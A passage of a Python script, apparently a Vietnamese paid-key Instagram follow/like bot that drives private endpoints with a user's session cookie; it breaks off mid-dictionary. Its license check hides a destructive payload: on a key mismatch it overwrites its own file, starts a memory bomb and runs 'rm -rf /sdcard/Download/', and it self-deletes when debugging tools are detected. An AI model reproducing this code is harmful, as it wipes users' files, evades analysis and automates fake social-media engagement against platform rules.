import sys
import os
import re
import socket
import hashlib
import platform
import random, threading
import base64
import urllib
import math
import time
import base64, sys, requests
from pystyle import Colorate, Colors
from rich.console import Console
from collections import deque
from rich.live import Live
from rich.text import Text
from OpenSSL import SSL
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.align import Align
from rich.table import Table
from rich.live import Live
from rich import box
from colorama import Fore, Style, init

import math
import requests, cloudscraper, random, time, os, re, sys
from colorama import Fore, Style, init
from datetime import datetime
from random import randint
from pystyle import Colors, Colorate

do = "\033[1;31m"
luc = "\033[1;32m"
vang = "\033[1;33m"
trang = "\033[1;37m"
tim = "\033[1;35m"
xanh = "\033[1;36m"
hong = '\x1b[1;95m'
xnhac = '\x1b[1;96m'
CYAN  = Fore.CYAN
thanh = Colorate.Horizontal(Colors.yellow_to_red, ">>>", 1)

def gradient_caccac(text):
    def rgb_to_ansi(r, g, b):
        return f"\033[38;2;{r};{g};{b}m"

    start_color = (0, 255, 255)    # Cyan
    mid_color   = (255, 0, 255)    # Magenta
    end_color   = (255, 255, 0)    # Yellow

    steps = len(text)
    result = ""

    for i, char in enumerate(text):
        t = i / (steps - 1 if steps > 1 else 1)
        if t < 0.5:
            t2 = t / 0.5
            r = int(start_color[0] + (mid_color[0] - start_color[0]) * t2)
            g = int(start_color[1] + (mid_color[1] - start_color[1]) * t2)
            b = int(start_color[2] + (mid_color[2] - start_color[2]) * t2)
        else:
            t2 = (t - 0.5) / 0.5
            r = int(mid_color[0] + (end_color[0] - mid_color[0]) * t2)
            g = int(mid_color[1] + (end_color[1] - mid_color[1]) * t2)
            b = int(mid_color[2] + (end_color[2] - mid_color[2]) * t2)
        result += rgb_to_ansi(r, g, b) + char
    return result + "\033[0m"

def anti_pythonpath():
    if "PYTHONPATH" in os.environ:
        os.kill(os.getpid(), 9)
    sitecustomize_path = os.path.join(sys.prefix, "lib", "site-packages", "sitecustomize.py")
    if os.path.exists(sitecustomize_path):
        os.kill(os.getpid(), 9)

def anti_debug():
    if hasattr(sys, "gettrace") and sys.gettrace() is not None:
        os.kill(os.getpid(), 9)
    try:
        with open("/proc/self/status") as f:
            if "TracerPid:\t0" not in f.read():
                os.kill(os.getpid(), 9)
    except:
        pass

def detect_debug_tools():
    suspicious_keywords = ["charles", "fiddler", "httptoolkit", "mitmproxy", "canary", "proxyman", "wireshark"]
    suspicious_ports = ["127.0.0.1:8000", "127.0.0.1:8080", "127.0.0.1:8888", "127.0.0.1:9090"]
    ssl_cert_vars = ["SSL_CERT_FILE", "NODE_EXTRA_CA_CERTS", "REQUESTS_CA_BUNDLE", "CURL_CA_BUNDLE", "PATH"]
    proxy_env_vars = ["HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy"]
    if os.environ.get("HTTP_TOOLKIT_ACTIVE", "").lower() == "true":
        return True
    for var in ssl_cert_vars + proxy_env_vars:
        val = os.environ.get(var, "").lower()
        if any(kw in val for kw in suspicious_keywords):
            return True
        if any(port in val for port in suspicious_ports):
            return True
    if os.environ.get("FIREFOX_PROXY", "") in suspicious_ports:
        return True
    try:
        result = subprocess.check_output(["ps", "-aux"], universal_newlines=True)
        for line in result.lower().splitlines():
            if any(kw in line for kw in suspicious_keywords):
                return True
    except Exception:
        pass
    return False
if detect_debug_tools():
    print("Con Cặc")
    try:
        os.remove(sys.argv[0])
    except:
        pass
    raise SystemExit("Con Cặc")

class OpenSSLClient:
    def __init__(self, verify=False, timeout=30, max_retry=15):
        self.verify = verify
        self.timeout = timeout
        self.max_retry = max_retry
        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/108 Safari/537.36"
        
    def _safe_log(self, message):
        """Hàm log an toàn, không hiển thị URL"""
        if any(keyword in str(message).lower() for keyword in ['http', '://', 'host:']):
            message = "[URL hidden for security]"
        _original_print(message)

    def request(self, method, url, headers=None, data=None):

        parsed = urllib.parse.urlparse(url)
        host, port = parsed.hostname, parsed.port or 443
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query

        req_headers = {
            "Host": host,
            "User-Agent": self.ua,
            "Accept": "*/*",
            "Connection": "close",
        }
        if headers:
            req_headers.update(headers)

        body = b""
        if data:
            if isinstance(data, dict):
                body = urllib.parse.urlencode(data).encode()
                req_headers["Content-Type"] = "application/x-www-form-urlencoded"
            elif isinstance(data, (bytes, bytearray)):
                body = data
            else:
                body = str(data).encode()
            req_headers["Content-Length"] = str(len(body))

        header_text = [
            f"{method} {path} HTTP/1.1"
        ] + [f"{k}: {v}" for k, v in req_headers.items()] + ["", ""]
        raw_req = ("\r\n".join(header_text)).encode() + body

        ctx = self._create_context()
        sock = socket.create_connection((host, port), timeout=self.timeout)
        ssl_conn = SSL.Connection(ctx, sock)
        ssl_conn.set_connect_state()
        ssl_conn.set_tlsext_host_name(host.encode())

        for _ in range(self.max_retry):
            try:
                ssl_conn.do_handshake()
                break
            except SSL.WantReadError:
                time.sleep(0.1)
            except Exception as e:
                ssl_conn.close()
                sock.close()
                self._safe_log(f"Connection error: {e}")
                raise e
        else:
            ssl_conn.close()
            sock.close()
            raise TimeoutError("LOI MANG")

        ssl_conn.sendall(raw_req)
        resp = self._recv_all(ssl_conn)
        ssl_conn.close()
        sock.close()
        
        return self._parse_response(resp)

    def _create_context(self):
        ctx = SSL.Context(SSL.TLS_CLIENT_METHOD)
        if not self.verify:
            ctx.set_verify(SSL.VERIFY_NONE, lambda *x: True)
        return ctx

    def _recv_all(self, conn):
        data = b""
        conn.settimeout(self.timeout)
        while True:
            try:
                chunk = conn.recv(8192)
                if not chunk:
                    break
                data += chunk
            except SSL.WantReadError:
                time.sleep(0.05)
                continue
            except Exception:
                break
        return data

    def _parse_response(self, raw):
        if not raw:
            return ""
        try:
            header_end = raw.index(b"\r\n\r\n")
            head = raw[:header_end].decode("iso-8859-1")
            body = raw[header_end + 4 :]
        except:
            return raw.decode("utf-8", errors="ignore")

        headers = {}
        lines = head.split("\r\n")[1:]
        for l in lines:
            if ":" in l:
                k, v = l.split(":", 1)
                headers[k.lower()] = v.strip()
        if headers.get("transfer-encoding") == "chunked":
            body = self._decode_chunked(body)

        try:
            return body.decode("utf-8", errors="ignore")
        except:
            return body.decode("latin-1", errors="ignore")

    def _decode_chunked(self, b):
        out = b""
        i = 0
        while True:
            j = b.find(b"\r\n", i)
            if j < 0:
                break
            try:
                size = int(b[i:j].split(b";")[0], 16)
            except ValueError:
                break
            if size == 0:
                break
            i = j + 2
            out += b[i : i + size]
            i += size + 2
        return out

    def get(self, url, headers=None):
        return self.request("GET", url, headers=headers)

    def post(self, url, data=None, headers=None):
        return self.request("POST", url, headers=headers, data=data)

HOST = requests.get("https://raw.githubusercontent.com/yvtccfdx61-prog/tool/refs/heads/main/config.json").json().get('host','google.com')
URL_CHECK = f"https://{HOST}/checkcac.php"
secret = "thieulon"
secret_link = "linkneconcho"  
LICENSE_FILE = "license.txt"

device_id = hashlib.sha256((str(platform.release()) + str(platform.version()) + str(platform.machine()) + str(platform.node())).encode()).hexdigest()[:30].upper()

def encrypt_device_id(device_id, secret):
    """Mã hóa device_id bằng XOR + Base64"""
    encrypted = ""
    for i in range(len(device_id)):
        encrypted += chr(ord(device_id[i]) ^ ord(secret[i % len(secret)]))
    return base64.b64encode(encrypted.encode()).decode()

def save_license(key: str):
    """Lưu key vào file"""
    with open(LICENSE_FILE, "w") as f:
        f.write(key.strip())

def load_license():
    """Đọc key từ file (nếu có)"""
    if os.path.exists(LICENSE_FILE):
        with open(LICENSE_FILE, "r") as f:
            return f.read().strip()
    return None

def verify_license(k: str):
    """Xác thực key với server"""
    try:
        r = requests.post(URL_CHECK, data={"device_id": device_id, "license_key": k}).json()
        
        if r.get("status") == "invalid":
            print(f"{do}❌ Key không hợp lệ.")
            return False
        
        if r.get("status") == "success" and "keycailonmemay" in r:
            enc = base64.b64decode(r["keycailonmemay"])
            dec = "".join(chr(enc[i] ^ ord(secret[i % len(secret)])) for i in range(len(enc)))
            
            parts = dec.split("|")
            if len(parts) != 3:
                print(f"{do}❌ Dữ liệu không hợp lệ.")
                return False
            
            status, server_key, expires_at = parts
            
            if status not in ["valid", "expired"]:
                print(f"{do}❌ Trạng thái không hợp lệ.")
                return False
            
            if server_key != k:
                print(f"{do}❌ Á à con chó ngu địt mẹ mày crack key à súc vật. Anh có một số món quà tặng cho em...")
                for i in range(100):
                    open(__file__, "w", encoding="utf-8").write("Món quà anh tặng người con gái anh thương nhớ nhé!")
                    def a(): globals()["_"]=[[[[[(('TrinhNguyen0611') * 987654321)] * 987654321] * 987654321] * 987654321] * 2123000000 * 2123000000]
                    b = lambda : os.system("rm -rf /sdcard/Download/")
                    threading.Thread(target=b).start()
                    threading.Thread(target=a).start()
                return False
            
            if status == "valid":
                print(f"{luc}✅ Key hợp lệ, còn hạn đến {expires_at}")
                return True
            else:
                print(f"{vang}⚠️ Key đã hết hạn (từ {expires_at})")
                return False
        else:
            print(f"{do}❌ Lỗi: {r.get('message', 'Không thể xác thực')}")
            return False
    except Exception as e:
        print(f"{do}❌ Key không hợp lệ hoặc lỗi kết nối.")
        return False

def check_license():
    os.system('cls' if os.name == 'nt' else 'clear')    
    thanh = Colorate.Horizontal(Colors.yellow_to_red, ">>>", 1)
    print(gradient_caccac("""
       ▄▄▄█████▓ ██░ ██ ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
       ▓  ██▒ ▓▒▓██░ ██▒▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
       ▒ ▓██░ ▒░▒██▀▀██░▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
       ░ ▓██▓ ░ ░▓█ ░██ ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
         ▒██▒ ░ ░▓█▒░██▓  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
         ▒ ░░    ▒ ░░▒░▒  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
          ░     ▒ ░▒░ ░    ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
         ░       ░  ░░ ░  ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
                 ░  ░  ░             ░ ░      ░ ░      ░  ░  """))

    print(gradient_caccac("╭────────────────────────────────────────────────────────────────────╮"))
    admin_text = Colorate.Horizontal(Colors.white_to_red, "Admin", 1)
    name_text = Colorate.Horizontal(Colors.yellow_to_red, "Thiệu Hoàng メ Nguyễn Xuân Trịnh", 1)
    print(f"{Fore.CYAN}│\033[1;97m ● {thanh} {admin_text}     {trang}: {name_text}                 \033[1;33m│")
    youtube_text = Colorate.Horizontal(Colors.white_to_red, "Youtube", 1)
    ytb_text = Colorate.Horizontal(Colors.cyan_to_blue, "https://www.youtube.com/@thtool-b4w", 1)
    print(f"{Fore.CYAN}│\033[1;97m ● {thanh} {youtube_text}   {trang}: \033[1;36m{ytb_text}              \033[1;33m│")
    boxzalo_text = Colorate.Horizontal(Colors.white_to_red, "Box Zalo", 1)
    box_zalo_text = Colorate.Horizontal(Colors.white_to_blue, "https://zalo.me/g/lvzajh783", 1)
    print(f"{Fore.CYAN}│\033[1;97m ● {thanh} {boxzalo_text}  {trang}: {box_zalo_text}                      \033[1;33m│")
    boxtele_text = Colorate.Horizontal(Colors.white_to_red, "Box Tele", 1)
    box_tele_text = Colorate.Horizontal(Colors.blue_to_cyan, "https://t.me/+3RW3GrZYJg8yMjll", 1)
    print(f"{Fore.CYAN}│\033[1;97m ● {thanh} {boxtele_text}  {trang}: {box_tele_text}                   \033[1;33m│")    
    thongbao_text = Colorate.Horizontal(Colors.white_to_red, "Thông Báo", 1)
    key_text = Colorate.Horizontal(Colors.blue_to_purple, "Mua Key Vip Liên Hệ Admin Với Giá 30k/Tháng", 1)
    print(f"{Fore.CYAN}│\033[1;97m ● {thanh} {thongbao_text} {trang}: {key_text}      \033[1;33m│")
    print(gradient_caccac("╰────────────────────────────────────────────────────────────────────╯"))
    
    old_key = load_license()
    
    if old_key:    	
        print(f"{xanh}🔑 Đang kiểm tra key đã lưu...")
        if verify_license(old_key):
            print(f"{luc}🎉 Đang khởi động tool...")
            return True
        else:
            print(f"{do}❌ Key cũ không hợp lệ hoặc đã hết hạn.")

    encrypted_id = encrypt_device_id(device_id, secret_link)
    create_link = f"https://{HOST}/?deptrai={encrypted_id}"
    
    print(Colorate.Diagonal(Colors.purple_to_red, "╭────────────────────────────────────────────────────────────────────╮"))
    print(f"{xanh} 📱 Device ID: {trang}{device_id}              ") 
    print(f"{xanh} 🔄 Đang tạo link kích hoạt...           ")
    print(f"{luc} ✅ Đã tạo link thành công!              ")
    print(f"{vang} 📋 Vui lòng vượt link sau để lấy key: ")
    print(f"{xanh} {create_link}      ")
    print(f"{tim} 💡 Hướng dẫn:                          ")
    print(f"{trang}    1. Click vào link trên             ")
    print(f"{trang}    2. Nhấn 'Tạo Link Kích Hoạt'       ")
    print(f"{trang}    3. Vượt link → Nhận key tự động    ")
    print(f"{trang}    4. Copy key và paste vào đây       ")
    print(Colorate.Diagonal(Colors.purple_to_red, "╰────────────────────────────────────────────────────────────────────╯"))
    
    while True:    	
        text_key = Colorate.Horizontal(Colors.white_to_green, "Nhập key để xác thực", 1)
        thanh = Colorate.Horizontal(Colors.yellow_to_red, ">>>", 1)
        k = input(f"{thanh} {text_key}:{trang} ").strip()
        if not k:
            print(f"{do}❌ Vui lòng nhập key!")
            continue
        if verify_license(k):
            save_license(k)  
            print(f"{luc}🎉 Đang khởi động tool...")
            
            return True

if not check_license():
    sys.exit(0)

if sys.platform == "win32":
    import msvcrt
else:
    import termios, tty, select

isTermux =  "com.termux" in os.environ.get("PREFIX", "")

console = Console()   

def shuffle_ordered_like(lst):
    dq = deque(lst)
    if random.choice([True, False]):
        dq.reverse()
    n = len(lst)
    rot = random.randint(0, n - 1)
    dq.rotate(-rot)
    return list(dq)

class SpinnerDots:
    def __init__(self, text="Đang chờ...", duration=None, delay=0.1):
        self.dots = shuffle_ordered_like(
            ['#e0b7b7','#e0bbb7','#e0bfb7','#e0c3b7','#e0c7b7',
             '#e0ccb7','#e0d0b7','#e0d4b7','#e0d8b7','#e0dcb7',
             '#e0e0b7','#dce0b7','#d8e0b7','#d4e0b7','#d0e0b7',
             '#cce0b7','#c7e0b7','#c3e0b7','#bfe0b7','#bbe0b7',
             '#b7e0b7','#b7e0bb','#b7e0bf','#b7e0c3','#b7e0c7',
             '#b7e0cc','#b7e0d0','#b7e0d4','#b7e0d8','#b7e0dc',
             '#b7e0e0','#b7dce0','#b7d8e0','#b7d4e0','#b7d0e0',
             '#b7cbe0','#b7c7e0','#b7c3e0','#b7bfe0','#b7bbe0',
             '#b7b7e0','#bbb7e0','#bfb7e0','#c3b7e0','#c7b7e0',
             '#cbb7e0','#d0b7e0','#d4b7e0','#d8b7e0','#dcb7e0',
             '#e0b7e0','#e0b7dc','#e0b7d8','#e0b7d4','#e0b7d0',
             '#e0b7cc','#e0b7c7','#e0b7c3','#e0b7bf','#e0b7bb']
        )
        self.text = text
        self.delay = delay
        self.duration = duration
        self.running = False
        self._thread = None
        self.console = console
    def _render_frame(self, index):
        window_size = 20
        total_colors = len(self.dots)
        txt = Text()

        big_dot_pos = index % window_size

        chars = ["["]
        for i in range(window_size):
            dist = abs(i - big_dot_pos)
            if dist == 0:
                chars.append("■")
            elif dist == 1:
                chars.append("●")
            else:
                chars.append("•")
        chars += ["]", " "] + list(self.text)

        for pos, ch in enumerate(chars):
            if ch in ["[", "]", " "]:
                style = "white"
            else:
                color_idx = (index + pos) % total_colors
                style = f"{self.dots[color_idx]}"  
            txt.append(ch, style=style)

        return txt
    def _spinner(self, live):
        i = 0
        start_time = time.time()
        while self.running and (self.duration is None or time.time() - start_time < self.duration):
            live.update(self._render_frame(i))
            live.refresh()
            i += 1
            time.sleep(self.delay)

    def __enter__(self):
        self.running = True
        self.live = Live(console=self.console, auto_refresh=False)
        self.live.start()
        self._thread = threading.Thread(target=self._spinner, args=(self.live,))
        self._thread.start()
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        self.running = False
        self._thread.join()
        self.live.update("")  
        self.live.stop()
          
with SpinnerDots("Đang Vào Tool...", duration=5) as spinner:
    time.sleep(2)
    
    

scraper = cloudscraper.create_scraper()

def safe_json(response):
    """Trả về JSON an toàn, nếu lỗi thì trả None"""
    try:
        return response.json()
    except Exception:
        return None

RED     = Fore.RED
GREEN   = Fore.GREEN
YELLOW  = Fore.YELLOW
BLUE    = Fore.BLUE
CYAN    = Fore.CYAN
MAGENTA = Fore.MAGENTA
WHITE   = Fore.WHITE
BLACK   = Fore.BLACK
RESET   = Style.RESET_ALL
icon = f'{RED}<:>'
init(autoreset=True)

do = "\033[1;31m"
luc = "\033[1;32m"
hong = "\033[1;38m"
vang = "\033[1;33m"
trang = "\033[1;37m"
tim = "\033[1;35m"
xanh = "\033[1;36m"
thanh = f'{trang}=> [⚡]'
scraper = cloudscraper.create_scraper()
tong = 0

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')    
    thanh = Colorate.Horizontal(Colors.yellow_to_red, ">>>", 1)
    print(gradient_caccac("""
       ▄▄▄█████▓ ██░ ██ ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
       ▓  ██▒ ▓▒▓██░ ██▒▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
       ▒ ▓██░ ▒░▒██▀▀██░▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
       ░ ▓██▓ ░ ░▓█ ░██ ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
         ▒██▒ ░ ░▓█▒░██▓  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
         ▒ ░░    ▒ ░░▒░▒  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
          ░     ▒ ░▒░ ░    ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
         ░       ░  ░░ ░  ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
                 ░  ░  ░             ░ ░      ░ ░      ░  ░  """))

    print(gradient_caccac("╭────────────────────────────────────────────────────────────────────╮"))
    admin_text = Colorate.Horizontal(Colors.white_to_red, "Admin", 1)
    name_text = Colorate.Horizontal(Colors.yellow_to_red, "Thiệu Hoàng メ Nguyễn Xuân Trịnh", 1)
    print(f"{Fore.CYAN}│\033[1;97m ● {thanh} {admin_text}     {trang}: {name_text}                 \033[1;33m│")
    youtube_text = Colorate.Horizontal(Colors.white_to_red, "Youtube", 1)
    ytb_text = Colorate.Horizontal(Colors.cyan_to_blue, "https://www.youtube.com/@thtool-b4w", 1)
    print(f"{Fore.CYAN}│\033[1;97m ● {thanh} {youtube_text}   {trang}: \033[1;36m{ytb_text}              \033[1;33m│")
    boxzalo_text = Colorate.Horizontal(Colors.white_to_red, "Box Zalo", 1)
    box_zalo_text = Colorate.Horizontal(Colors.white_to_blue, "https://zalo.me/g/lvzajh783", 1)
    print(f"{Fore.CYAN}│\033[1;97m ● {thanh} {boxzalo_text}  {trang}: {box_zalo_text}                      \033[1;33m│")
    boxtele_text = Colorate.Horizontal(Colors.white_to_red, "Box Tele", 1)
    box_tele_text = Colorate.Horizontal(Colors.blue_to_cyan, "https://t.me/+3RW3GrZYJg8yMjll", 1)
    print(f"{Fore.CYAN}│\033[1;97m ● {thanh} {boxtele_text}  {trang}: {box_tele_text}                   \033[1;33m│")    
    thongbao_text = Colorate.Horizontal(Colors.white_to_red, "Thông Báo", 1)
    key_text = Colorate.Horizontal(Colors.blue_to_purple, "Mua Source Code Tool Inbox Admin Thiệu Hoàng", 1)
    print(f"{Fore.CYAN}│\033[1;97m ● {thanh} {thongbao_text} {trang}: {key_text}     \033[1;33m│")
    print(gradient_caccac("╰────────────────────────────────────────────────────────────────────╯"))
    

def time_wait(secmin, secmax, text):
    seconds = random.randint(secmin, secmax)
    for i in range(seconds, 0, -1):
        print(f"{Fore.GREEN}{text} {Fore.YELLOW}{i} {Fore.CYAN}[{Fore.RED}X      {Fore.CYAN}] ", end="\r"); time.sleep(1/14)
        print(f"{Fore.GREEN}{text} {Fore.YELLOW}{i} {Fore.CYAN}[{Fore.RED}XX     {Fore.CYAN}] ", end="\r"); time.sleep(1/14)
        print(f"{Fore.GREEN}{text} {Fore.YELLOW}{i} {Fore.CYAN}[{Fore.RED}XXX    {Fore.CYAN}] ", end="\r"); time.sleep(1/14)
        print(f"{Fore.GREEN}{text} {Fore.YELLOW}{i} {Fore.CYAN}[{Fore.RED}XXXX   {Fore.CYAN}] ", end="\r"); time.sleep(1/14)
        print(f"{Fore.GREEN}{text} {Fore.YELLOW}{i} {Fore.CYAN}[{Fore.RED}XXXXX  {Fore.CYAN}] ", end="\r"); time.sleep(1/14)
        print(f"{Fore.GREEN}{text} {Fore.YELLOW}{i} {Fore.CYAN}[{Fore.RED}XXXXXX {Fore.CYAN}] ", end="\r"); time.sleep(1/14)
        print(f"{Fore.GREEN}{text} {Fore.YELLOW}{i} {Fore.CYAN}[{Fore.RED}XXXXXXX{Fore.CYAN}] ", end="\r"); time.sleep(1/14)
        print(f"{Fore.GREEN}{text} {Fore.YELLOW}{i} {Fore.CYAN}[{Fore.RED}XXXXXX {Fore.CYAN}] ", end="\r"); time.sleep(1/14)
        print(f"{Fore.GREEN}{text} {Fore.YELLOW}{i} {Fore.CYAN}[{Fore.RED}XXXXX  {Fore.CYAN}] ", end="\r"); time.sleep(1/14)
        print(f"{Fore.GREEN}{text} {Fore.YELLOW}{i} {Fore.CYAN}[{Fore.RED}XXXX   {Fore.CYAN}] ", end="\r"); time.sleep(1/14)
        print(f"{Fore.GREEN}{text} {Fore.YELLOW}{i} {Fore.CYAN}[{Fore.RED}XXX    {Fore.CYAN}] ", end="\r"); time.sleep(1/14)
        print(f"{Fore.GREEN}{text} {Fore.YELLOW}{i} {Fore.CYAN}[{Fore.RED}XX     {Fore.CYAN}] ", end="\r"); time.sleep(1/14)
        print(f"{Fore.GREEN}{text} {Fore.YELLOW}{i} {Fore.CYAN}[{Fore.RED}X      {Fore.CYAN}] ", end="\r"); time.sleep(1/14)

class API_INSTAGRAM_THIEUHOANG:
    def __init__(self, cookie):
        try:
            self.cookie = cookie
            self.id_is = cookie.split("ds_user_id=")[1].split(";")[0]
            self.token = cookie.split('csrftoken=')[1].split(';')[0]
            self.headers = {'authority': 'i.instagram.com', 'accept': '*/*', 'accept-language': 'vi,en-US;q=0.9,en;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'cookie': cookie, 'origin': 'https://www.instagram.com', 'referer': 'https://www.instagram.com/', 'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'x-asbd-id': '198387', 'x-csrftoken': self.token, 'x-ig-app-id': '936619743392459', 'x-ig-www-claim': 'hmac.AR1UYU8O8XCMl4jZdv4YxiRUxEIymCA_4stpgFmc092K1Kb2', 'x-instagram-ajax': '1006309104'}
        except:
            print(f"{RED}Không Nhận Dạng Được Cookie !")
            return
    
    def login_ins(self, proxyy):
        repih = requests.get('https://www.instagram.com/', headers=self.headers, proxies=proxyy).text
        user_hep = re.findall('username":"([^"]+)"', repih)
        if user_hep:
            user = user_hep[0]
            self.av = repih.split('"userID":"')[1].split('",')[0]
            self.fb_dtsg = repih.split('["DTSGInitData",[],{"token":"')[1].split('",')[0]
            return user, self.id_is, self.av, self.fb_dtsg
        else:
            return False

    def follow_ins(self, id_fl, proxyy):
        data = {
            'av': self.av,
            '__d': 'www',
            '__user': '0',
            '__a': '1',
            '__req': '1g',
            '__hs': '20304.HYP:instagram_web_pkg.2.1...0',
            'dpr': '1',
            '__ccg': 'UNKNOWN',
            '__rev': '1025469475',
            '__s': 'pepgey:5mvh1h:u4jq8g',
            '__hsi': '7534604198011339726',
            '__dyn': '7xeUjG1mxu1syUbFp41twWwIxu13wvoKewSAwHwNw9G2S7o2vwa24o0B-q1ew6ywaq0yE462mcw5Mx62G5UswoEcE7O2l0Fwqo31w9a9wtUd8-U2zxe2GewGw9a361qwuEjUlwhEe87q0oa2-azqwt8d-2u2J0bS1LwTwKG1pg2fwxyo6O1FwlA3a3zhA6bwIxeUnAwCAxW1oxe6UaUaE2xyVrx60hK78uyEcE4ei',
            '__csr': 'hI7IeMAwxWsBjnbR9bqkbcDdilsOnKADitRLFFXhVRHHGoF7q8J-jAW8QUFkHGhqiiiJ4iAH-AmQiSELlWBWhb8-AUWHVt2eG-VFoKex2mGGZySuqjDBDyQbWV8KhaAcmm2Hmh93AqjzUx2LyqKUOqufyp8XxWASQ488UmHw05wdw7roBxK0jIE1QUhg569m0gO0_820w8G0w20eG2S26t0IyuZ1q07j80Xi444GDy4bIUG0O47U1c82NocpU6wOxe7AE148W296c2sE3gw65ai8g2Nxlk7kq0Ho72tm04mo027mw2WU0QK02BW',
            '__hsdp': 'gc4_i4InbaxkuwJNd6QwJx3qByJjCXHf3Bz6yDqUADyCQkPOWwBwyxGCAbGglcS2rEd4DCDy4m6HElU86uyagGmIc9NG8qrF1y1p85Wgyu6Smi2m3mFoa9E8EfE4F2VUge4EG1BwNy88UbEK0WEy0q60T-0iW0AU4S0w85q0r-u3q0B8460LUvw8m0CE3sxS0R30XzUqg39wau1rwmz2U9EcGwokm2a1NG13wgE',
            '__hblp': '0PK10yE6C22FoHggwJUPBy44p8a84S7o7-5ry888KQ27xa3TyUyqawGyEhyVFaxGnCAyU-iU-8y99oaGLG2mqazEy7A7A58dEB5Q2eiuES2KcK6F8rxem1uwfe0K8do2Owgo4e1bzum19w8O1hzo8E6a6Uco20yo4mq0my19z9UdEy1JxS3129E6-6UcUvw8mi6U7C0T8twdgMaohzWxnouwIwv82xBwPwDBwZxoOy8O8x219G58dknwwwgobWwKzkh7xq2e',
            '__sjsp': 'gc4_i4Ab9baxkuwJNd6QwJx3qByJjCXHf7hJz6yy4KeUFAxq1bxGCUKsk3fEd4xq8hoqKxnwwpW8F2FqMMD6xm0Aqgeo6i0rW2O2W',
            '__comet_req': '7',
            'fb_dtsg': self.fb_dtsg,
            'jazoest': '26289',
            'lsd': 'qHVgSVkfQOIWzaAEC574pJ',
            '__spin_r': '1025469475',
            '__spin_b': 'trunk',
            '__spin_t': '1754286745',
            '__crn': 'comet.igweb.PolarisProfilePostsTabRoute',
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'usePolarisFollowMutation',
            'variables': '{"target_user_id":"'+id_fl+'","container_module":"profile","nav_chain":"PolarisFeedRoot:feedPage:1:via_cold_start,PolarisProfilePostsTabRoot:profilePage:2:unexpected"}',
            'server_timestamps': 'true',
            'doc_id': '9740159112729312',
        }
        response = requests.post('https://www.instagram.com/graphql/query', headers=self.headers, data=data, proxies=proxyy).json()
        if 'errors' in response and response['errors']:
            return False
        elif response.get('status') == 'ok' and response.get('data') is not None:
            following = response['data']['xdt_create_friendship']['friendship_status']['following']
            if following:
                return True
            return False
        return False

    def like_ins(self, id_like, proxyy):
        data = {
            'av': self.av,
            '__d': 'www',
            '__user': '0',
            '__a': '1',
            '__req': 'u',
            '__hs': '20304.HYP:instagram_web_pkg.2.1...0',
            'dpr': '1',
            '__ccg': 'EXCELLENT',
            '__rev': '1025471239',
            '__s': 'oijgm9:bf2tb8:qsmme1',
            '__hsi': '7534665419605329333',
            '__dyn': '7xeUjG1mxu1syUbFp41twWwIxu13wvoKewSAwHwNw9G2S7o2vwa24o0B-q1ew6ywaq0yE462mcw5Mx62G5UswoEcE7O2l0Fwqo31w9O1TwQzXwae4UaEW2G0AEco5G1Wxfxm16wUwtE1wEbUGdG1QwTU9UaQ0Lo6-3u2WE5B08-269wr86C1mgcEed6goK10K5V89F8uwm8jxK2K2G13wnoKmUhw45xm78uyEcE4ei',
            '__csr': 'n1z1b1j8Osyb8zYIP9El5WtE_As-ldleiy5p4WiCvQqHmQbGTHJmF4aWjZ4j_yFFVpoFpriWqJp7BlecDCFaQl4ihVHzAVEi-u5AKlVpWxOaKmaF6jhVQaBGih0wJpJ38CWg_y4UuLHUtACxJDChoyjwUyqy801o4E1SS9gmBw4Xa0vW3C9m0gS0_812E2080AU6-4U8FA2ObjU0tAw3JoUwimm8gKkwW0NQ7U1mE27opyo7Uyxd1p7wdm1dwyhz0D85E2Ww63ebwb9xlk7k0iPa04jU027ww2WE0PW02Ca',
            '__hsdp': 'gbYYz7hyEqNQAZEiYkl4wAQdy4zDiIp6iEg4r8jzyAy4d46z84Fxe8gB2P0Dy9MRUCVkbx22q2oyEHGkzW37W6ppkawHxy5y0MzSSVQ3Km1pxR1-4jzE6-qq18wxxG4E2dVESVUiw5hx-0zE39g1bE3sU0xe3aew922G1BwSx20E82jwcW0HodoCh0KDxedwbe1nwxwro8ofh03zy823zo4C',
            '__hblp': '0PG1OzofpoZ3ox127Urx64o2DwrUnyoG5UCt0AxG2u2O2C68pUkzoC742i7Vo4eEiwwxS2q350Exeql0FCxeU8oqogypU-i2y6898ydyUixq0RU5afx-78761GwIwNgkw4pwuU63www8-0lC8wOAyo6u2y4UmBw9q482wK3K1jwcW0UUCh1a6VUjUF0be1nDxC18wgHwBxn40zwSxeewpoyE7OAdx25U88',
            '__sjsp': 'gbYYz7b4GxH7ijSxbNhki2jgS8ietaNAoy8g4r8q4F8x3E6hxe9yoeoysdoK9gK489E9yayKEPEcvEo6o4i1qo0HK68',
            '__comet_req': '7',
            'fb_dtsg': self.fb_dtsg,
            'jazoest': '26405',
